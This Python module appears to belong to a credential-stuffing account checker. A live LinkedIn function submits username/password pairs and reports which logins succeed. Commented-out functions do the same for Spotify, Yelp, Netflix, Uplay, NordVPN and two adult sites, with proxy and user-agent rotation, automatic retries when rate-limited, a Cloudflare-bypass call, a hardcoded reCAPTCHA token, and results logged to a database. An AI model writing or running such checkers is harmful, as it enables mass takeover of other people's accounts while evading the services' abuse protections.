from bs4 import BeautifulSoup

from manage_requests import ManageRequests


# def spotify(usr: str, pwd: str, mr: ManageRequests):
#         """
#         Todo to be completed
#         """
#     site_get = "https://accounts.spotify.com/it/login"
#     cookies = self.req.get(site_get).cookies.get_dict()
#     csrf = cookies["csrf_token"]
#     cookies["__bon"] = "MHwwfC00ODY2MjU5N3wtMjA0MzgyOTA3NHwxfDF8MXwx"  # Non me gusta hardcodarlo
#     site_post = site_get
#     site_post = "https://accounts.spotify.com/password/login/"
#     usr = creds.split(":")[0].strip()
#     pwd = creds.split(":")[1].strip()
#     self.req.headers.update({"content-length": str(9999)})
#     account_proxy = self.set_random_proxyy()
#     recaptcha = "3AOLTBLTG3vkAxIqYcJpKqDtD25hvebW9hG0YOMwv5-WR9V3HefOgKmKbEFGeloLzjOHilwU7qZlrj6YiI4C5kg83j283SYUoZKeqvOXhL-AGXGR8PygVup5Ae58MQNCdfFTPXkWpFrb_NUB3XrbKXVasonIKqUhFGcv91PWzVBw3Nsx-GlAeAqn2pz5uVVzQpVzssSZCs6ocBj9J_Bsuwln2GrQFfcgehsI7Pzv8aIfdSmVsSSBvTup6xBWbtRq2nUrigADfF8DrLmS1aRGuOTEFOvmYPwDA8GPchAtO-bx9GrIRkXkBlFJ-P4ZEix6fNxheA0tywNncAA67rg-G3gq8avBJG33P4Wvs9GHrxGbh8GSEnZ6IEdRkRTb9RhrIlQTGukAclGId"
#     res = self.post_with_checks(site_post,
#                                 data={"username": usr, "password": pwd, "csrf_token": csrf},
#                                 cookies=cookies)
#     print(res.content)


def linkedin(usr: str, pwd: str, mr: ManageRequests):
    """
    TODO test and fix, sometimes crashes
    """

    get_url = "https://www.linkedin.com/login"
    post_url = "https://www.linkedin.com/checkpoint/lg/login-submit"

    # Get main page with tokens
    res = mr.get_with_checks(get_url, headers={'User-Agent': 'Mozilla/5.0'})
    # Filter out tokens
    soup = BeautifulSoup(res.text, features="html.parser")
    csrf_token = soup.find('input', attrs={'name': 'csrfToken'})['value']
    s_id_string = soup.find('input', attrs={'name': 'sIdString'})['value']
    login_csrf_param = soup.find('input', attrs={'name': 'loginCsrfParam'})['value']

    # Post request to login
    res = mr.post_with_checks(post_url,
                              data={'session_key': usr,
                                    'session_password': pwd,
                                    'csrfToken': csrf_token,
                                    'sIdString': s_id_string,
                                    'loginCsrfParam': login_csrf_param,
                                    })
    mr.clear_cookies()
    if 'login' not in res.url:
        if 'challenge' not in res.url:
            print(res.url)
            return True
        else:
            # TODO Linkedin asks for a code sended to the email, we put a True for now but we can not really access
            #  the account
            return True
    else:
        return False

#
# def yelp(usr: str, pwd: str, mr: ManageRequests):
#     site_url = "https://www.yelp.co.uk/login"
#
#     # Get main page with csrf_token
#     res = mr.get_with_checks(site_url, headers={'User-Agent': 'Mozilla/5.0'})
#     # Filter out csrf_token value
#     soup = BeautifulSoup(res.text, features="html.parser")
#     try:
#         csrf_token = soup.find('form', id='ajax-login').find('input', 'csrf_token')['value']
#         # Post request to login
#         res = mr.post_with_checks(site_url,
#                                   data={'email': usr,
#                                         'password': pwd,
#                                         'csrf_token': csrf_token
#                                         })
#
#         mr.clear_cookies()
#         if res:
#             if 'login' not in res.url:
#                 return True
#             else:
#                 return False
#         else:
#             raise Exception("Yelp step 0 not implemented")
#
#     except TypeError:
#         if "Are you a human" in res.content.decode("utf-8"):
#             # TODO bypass recaptcha
#             log.debug("Must implement recaptcha for Yelp")
#             return False
#         else:
#             raise Exception("Yelp step 1 not implemented")
#     except AttributeError:
#         if "not allowed to access" in res.content.decode("utf-8"):
#             log.debug("Must do something (?) for Yelp")
#             return False
#         else:
#             raise Exception("Yelp step 2 not implemented")
#
#
# def youporn(usr: str, pwd: str, mr: ManageRequests):
#     post_url = "https://www.youporn.com/login/"
#     # Post request to login
#     res = mr.post_with_checks(post_url,
#                               data={'login[username]': usr,
#                                     'login[password]': pwd,
#                                     'login[previous]': '',
#                                     'login[logical_data': '{}',
#                                     })
#     mr.clear_cookies()
#     if res:
#         #TODO has some false positive
#         if "Bad credentials" in str(res.text):
#             return False
#         else:
#             print(res.content)
#             return True
#     else:
#         log.info("Youporn problem")
#         mr.set_random_proxy()
#         mr.set_random_user_agent()
#         return youporn(usr, pwd, mr)
#
#
# def pornhub(usr: str, pwd: str, mr: ManageRequests):
#     post_url = "https://www.pornhub.com/front/authenticate"
#     get_url = "https://www.pornhub.com/"
#     # Get main page with redirect and token
#     res = mr.get_with_checks(get_url, headers={'User-Agent': 'Mozilla/5.0'})
#     # Filter out redirect and token
#     soup = BeautifulSoup(res.text, features="html.parser")
#     token = soup.find('input', attrs={'name': 'token'})
#     if token:
#         token = token['value']
#         # Post request to login
#         res = mr.post_with_checks(post_url,
#                                   data={'username': usr,
#                                         'password': pwd,
#                                         'subscribe': 'undefined',
#                                         'setSendTip': 'false',
#                                         'remember_me': '0',
#                                         'from': 'pc_login_modal_:index',
#                                         'token': token,
#                                         })
#     else:
#         log.debug("Pornhub problem")
#         mr.clear_cookies()
#         mr.set_random_proxy()
#         mr.set_random_user_agent()
#         return pornhub(usr, pwd, mr)
#     mr.clear_cookies()
#     if int(json.loads(res.content)["success"]) == 1:
#         return True
#     else:
#         return False
#
#
# def netflix(usr: str, pwd: str, mr: ManageRequests):
#     site_url = "https://www.netflix.com/Login"
#
#     res = mr.get_with_checks(site_url, headers={'User-Agent': 'Mozilla/5.0'})
#
#     if res:
#         soup = BeautifulSoup(res.text, features="html.parser")
#         auth_url = soup.find('input', attrs={'name': 'authURL'})['value']
#
#         # Post request to login
#         res = mr.post_with_checks(site_url,
#                                   data={'email': usr,
#                                         'password': pwd,
#                                         'rememberMe': True,
#                                         'flow': 'websiteSignUp',
#                                         'mode': 'login',
#                                         'action': 'loginAction',
#                                         'withFields': 'email,password,rememberMe,nextPage',
#                                         'authURL': auth_url,
#                                         'nextPage': 'https://www.netflix.com/viewingactivity'
#                                         })
#         mr.clear_cookies()
#         if 'Login' not in res.url:
#             return True
#         else:
#             return False
#     else:
#         mr.clear_cookies()
#         return False
#
#
# def uplay(usr: str, pwd: str, mr: ManageRequests):
#     site_post = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
#     credentials = str.encode(usr + ":" + pwd)
#     encoding = b64encode(credentials).decode()
#     res = mr.post_with_checks(site_post, headers={"Content-Type": "application/json",
#                                                   "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
#                                                   "Authorization": "Basic " + encoding})
#     mr.clear_cookies()
#     if res:
#         if res.status_code == 200:
#             return True
#         else:
#             return False
#     else:
#         decode = res.content.decode("utf-8")
#         if "Invalid credentials" in decode or "Authentication forbidden" in decode:
#             return False
#         elif "Too many calls" in decode:
#             log.debug("Uplay problem")
#             mr.set_random_proxy()
#             mr.set_random_user_agent()
#             return uplay(usr, pwd, mr)
#         else:
#             log.debug("Uplay problem")
#             mr.set_random_proxy()
#             mr.set_random_user_agent()
#             return uplay(usr, pwd, mr)

# def nordvpn(usr: str, pwd: str, mr: ManageRequests):
#     """
#     Custom functions must have 3 params: username and password to check, and a ManageRequests object
#     The MR object has all the primitives that you need.
#     Remember to update the database via mr.db
#     """
#
#     site_post = "https://ucp.nordvpn.com/api/v1/users/login"
#     site_get = "https://ucp.nordvpn.com/login"
#     # Retrieve CF valid cookie
#
#     cookies = mr.bypass_cf(site_get)
#     # change proxy account
#     res = mr.post_with_checks(site_post,
#                               data={"username": usr, "password": pwd}, cookies=cookies)
#     res = dict(res.cookies).get("token", None)
#
#     # check if inside the cookie the token is set, if positive the account is valid
#     mr.clear_cookies()
#     if res:
#         mr.db.update_result(usr, pwd, "nordvpnProxy", True)
#         return True
#     else:
#         mr.db.update_result(usr, pwd, "nordvpnProxy", False)
#         return False
